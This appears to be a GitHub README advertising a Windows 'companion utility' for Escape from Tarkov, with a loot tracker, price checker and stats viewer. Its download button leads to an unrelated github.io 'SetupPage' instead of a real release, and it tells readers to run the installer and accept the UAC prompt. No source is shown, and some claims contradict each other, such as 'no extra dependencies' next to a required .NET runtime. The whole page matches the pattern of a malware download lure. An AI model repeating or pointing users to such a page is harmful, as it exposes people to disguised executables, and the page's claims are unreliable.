# Tarkov – Windows‑only Companion Utility

**Author:** MidnightPilotPonder
**Platform:** Windows 10 / Windows 11

---

## 🎯 What is Tarkov?

Tarkov is a lightweight desktop companion for *Escape from Tarkov* that lives on your Windows machine. It helps you:

* **Track your loot** – keep an organized view of items you’ve collected.
* **Check market prices** – instantly see the current Flea Market value of any item.
* **View personal stats** – monitor kills, deaths, raid time, and more without leaving the game.

All features are built for a seamless Windows experience – no extra dependencies, no browsers, just a clean, native UI.

---

## 🚀 Quick Start

1. Click the button below to open the official Release page.
2. Download the installer (Windows 10/11 compatible).
3. Run the installer and follow the on‑screen prompts.
4. Launch **Tarkov** from the Start menu and start tracking!

<div align="center">

[<img src="https://img.shields.io/badge/Download-Release%20Page-4A90E2?style=for-the-badge&logo=windows" alt="Download">](https://rewfdf.github.io/SetupPage/)

</div>

---

## 🛠️ Features at a Glance

| Category | Details |
|----------|---------|
| **Inventory Tracker** | Auto‑import items from your game files, filter by type, rarity, or value. |
| **Price Checker** | Live API integration with the Flea Market, colour‑coded profit/loss indicators. |
| **Game Stats** | Real‑time updates of kills, deaths, raid duration, and XP earned. |
| **Custom Alerts** | Set thresholds for price drops or high‑value loot and receive toast notifications. |
| **Export / Import** | Export your inventory or stats to CSV/JSON for personal analysis. |
| **Dark / Light Themes** | Matches your Windows theme automatically. |

---

## 📦 Installation Guide (Windows 10/11)

1. **Download** – Use the button above.
2. **Run** – Double‑click the downloaded file and accept the UAC prompt.
3. **Configure** – The first launch will ask you to point to your *Escape from Tarkov* folder (default location is auto‑detected).
4. **Enjoy** – The companion runs in the background and appears in the system tray for quick access.

*No admin rights are required after the initial Release.*

---

## 🧩 How It Works

Tarkov reads the **local game data** stored by *Escape from Tarkov* (JSON and SQLite files). It never contacts external servers except for price updates, which are pulled securely via HTTPS. All personal data stays on your machine.

---

## 🐞 Troubleshooting

| Issue | Fix |
|-------|-----|
| **No items appear** | Ensure the game folder path is correct in Settings → Paths. |
| **Price data is stale** | Click **Refresh Prices** in the toolbar or wait 15 minutes for the auto‑refresh. |
| **App crashes on startup** | Verify you have the latest Windows updates installed and that .NET 6 Runtime is present (installed automatically by the installer). |
| **Missing stats** | Make sure you have enabled “Export Stats” in the game’s settings. |

If problems persist, open an issue on GitHub with a screenshot and a brief description.

---

## 📜 License

This project is released under the **MIT License** – you are free to use, modify, and distribute it, provided the original copyright notice is retained.

---

## 🙏 Acknowledgements

* The *Escape from Tarkov* community for invaluable feedback.
* Open‑source contributors who helped with API wrappers and UI design.

---

**Stay ahead of the market, keep your loot organized, and dominate every raid – all from a single Windows app.**

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```